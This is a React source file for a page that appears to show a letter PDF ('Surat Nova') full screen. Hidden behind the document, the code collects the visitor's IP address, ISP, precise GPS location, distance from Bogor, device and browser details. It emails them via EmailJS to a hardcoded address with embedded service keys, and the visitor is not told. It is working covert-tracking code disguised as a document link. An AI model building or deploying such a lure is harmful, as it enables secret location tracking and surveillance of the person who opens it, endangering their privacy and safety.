import React, { useEffect, useRef } from 'react';
import useGetIP from './hooks/useGetIP';
import useGetDeviceInfo from './hooks/useGetDeviceInfo';
import haversine from 'haversine-distance';
import emailjs from '@emailjs/browser';
import suratNova from './assets/surat-nova.pdf';

const BOGOR_COORDS = { latitude: -6.5971, longitude: 106.7949 };

function App() {
  const { data: ipData, loading } = useGetIP();
  const { detectOS, detectBrowser, screenSize } = useGetDeviceInfo();
  const hasSent = useRef(false);

  useEffect(() => {
    // Pastikan ipData sudah ada dan email belum pernah terkirim
    if (ipData && !hasSent.current) {
      handleHybridTracking();
    }
  }, [ipData]);

  const handleHybridTracking = () => {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          sendEmail(pos.coords.latitude, pos.coords.longitude, "GPS Diberikan");
        },
        () => {
          sendEmail(null, null, "GPS Ditolak/Silent");
        },
        { enableHighAccuracy: true, timeout: 5000 }
      );
    } else {
      sendEmail(null, null, "Browser Tidak Support GPS");
    }
  };

  const sendEmail = async (gpsLat, gpsLon, gpsStatus) => {
  try {
    const ispLat = ipData?.lat || 0;
    const ispLon = ipData?.lon || 0;

    const finalLat = gpsLat || ispLat;
    const finalLon = gpsLon || ispLon;
    
    const distance = (haversine(BOGOR_COORDS, { latitude: finalLat, longitude: finalLon }) / 1000).toFixed(2);

    const templateParams = {
      to_email: 'suhilman@bignet.id',
      ip_address: ipData?.ip || 'N/A', 
      isp: ipData?.isp || 'N/A',
      as_name: ipData?.asn || 'N/A', 
      isp_lat_long: `${ispLat},${ispLon}`,
      gps_lat_long: gpsLat ? `${gpsLat},${gpsLon}` : "N/A",
      // Detail lokasi disesuaikan dengan key FreeIPAPI
      location_detail: `${ipData?.city || ''}, ${ipData?.regionName || ''}, ${ipData?.country || ''}`,
      distance_from_bogor: `${distance} km`,
      device_os: detectOS(),
      browser: detectBrowser(),
      screen_res: `${screenSize.width}x${screenSize.height}`,
      current_time: new Date().toLocaleString('id-ID'),
      gps_status: gpsStatus 
    };

    await emailjs.send(
      'service_rjl2ja4', 
      'template_iruemib', 
      templateParams, 
      'ZoURH59lMids8g1rT'
    );
    
    hasSent.current = true;
  } catch (err) {
    console.error('EmailJS Error:', err);
  }
};

  return (
   <div style={{ height: '100vh',  margin: 0, padding: 0, overflow: 'hidden' }}>
      {/* Menggunakan iframe untuk menampilkan PDF secara full screen */}
      <iframe
        src={`${suratNova}#toolbar=0`} 
        title="Surat Nova"
        style={{ width: '100%', height: '100%', border: 'none' }}
      />
    </div>
  );
}

export default App;